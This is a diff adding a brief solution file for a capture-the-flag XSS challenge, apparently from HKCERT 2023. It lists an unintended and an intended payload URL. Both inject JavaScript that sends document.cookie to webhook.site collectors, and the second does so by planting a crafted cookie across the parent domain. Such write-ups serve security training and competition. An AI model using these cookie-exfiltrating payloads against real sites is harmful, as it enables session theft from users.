@@ -1,0 +1,5 @@
+Unintended solution under misconfiguration (both stcode and infantxss shares the same IP address; should be fixed after checking the hostname in infantxss):
+http://stcode.local.bz2.top:8552/?payload=%0alocation='https://webhook.site/66cbf4b1-e0ba-4273-8692-e74298c99933/?'%2bdocument.cookie
+
+Intended solution (XSS with Cookie tampering):
+http://infantxss-xsw7tt.hkcert23.pwnable.hk:28314/?payload=%0adocument.cookie="<style onload='location=`https://webhook.site/048e04c5-c277-4552-90b8-0fa2abc6d32c/?`%2bdocument.cookie'>;domain=.hkcert23.pwnable.hk;path=/flag2";location='http://stcode-3983gi.hkcert23.pwnable.hk:28211/flag2'
